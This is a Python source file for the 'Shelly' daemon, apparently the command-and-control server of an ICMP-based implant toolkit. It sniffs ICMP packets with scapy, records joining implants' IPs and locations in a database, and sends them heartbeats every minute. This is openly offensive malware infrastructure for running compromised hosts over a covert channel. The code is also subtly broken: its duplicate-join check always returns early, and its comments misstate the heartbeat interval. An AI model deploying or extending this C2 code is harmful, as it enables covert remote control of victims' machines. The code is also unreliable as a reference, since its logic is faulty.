#!/usr/bin/python3

"""
Shelly daemon
Vaughn Woerpel (vaughnw128/apicius)
"""

from scapy.all import sniff
from lib.shlib import Host
from tinydb import TinyDB, Query
import os
from itertools import count, filterfalse
import threading

TTL = int(64)
ICMP_ID = int(12800)

# Database directory
db_dir = "/var/lib/shelly"

class Daemon(Host):
    """
    Daemon class
     
    Extends from Host and incorporates special sniff callback responses specific
    to the needs of a daemon. Additionally controls the join and disconnect of devices to DB
    """

    def __init__(self):
        super().__init__()

        # Sets up the database
        os.makedirs(db_dir, exist_ok=True) 
        if os.path.exists(f"{db_dir}/db.json"):
            os.remove(f"{db_dir}/db.json")
        self.db = TinyDB(f"{db_dir}/db.json")

    """
    Sniff callback responses
    """

    def join(self, shellpack: dict) -> None:
        """
        Join response that joins the implant to the daemon
        """
        
        if self.db.search(Query().id == shellpack['id']) is not None:
            return

        # Grabs all existing numbers from the database and checks
        targets = self.db.all()
        number = [target['number'] for target in targets]

        # Initializes the target dict with 
        target = {
            "number": next(filterfalse(set(number).__contains__, count(1))),
            "id": str(shellpack['id']),
            "ip": shellpack['ip'],
            "location": shellpack['data'].decode(),
            "status": "CONNECTED"
            }

        # print(f"[JOIN] Join received from {shellpack['ip']}")

        self.db.insert(target)
        
    def heartbeat_response(self, shellpack: dict) -> None:
        """
        Grabs the response of the heartbeat and reconnects the host
        """

        self.db.update({'status': 'CONNECTED'}, Query().id == shellpack['id'])
        # print(f"[HEARTBEAT] Hearbeat received from {shellpack['ip']}")

    """
    Scheduled tasks
    """

    def heartbeat(self):
        """
        Schedules a heartbeat send once per second to disconnect or rejoin
        implants to the C2 server
        """

        # Sends heartbeats to all the targets
        for target in self.db.all():
            self.db.update({'status': 'DISCONNECTED'},Query().id == target['id'])
            self.send(target['ip'], "heartbeat", target['id'])

        # Sets the timer for once per minute
        timer = threading.Timer(60, self.heartbeat)
        timer.start()

def main():
    # Initializes the daemon
    shellyd = Daemon()

    # Starts the heartbeat process and the sniffer
    shellyd.heartbeat()
    sniff(iface=shellyd.iface, filter="icmp", prn=shellyd.sniff_callback, store="0")

if __name__ == "__main__":
    main()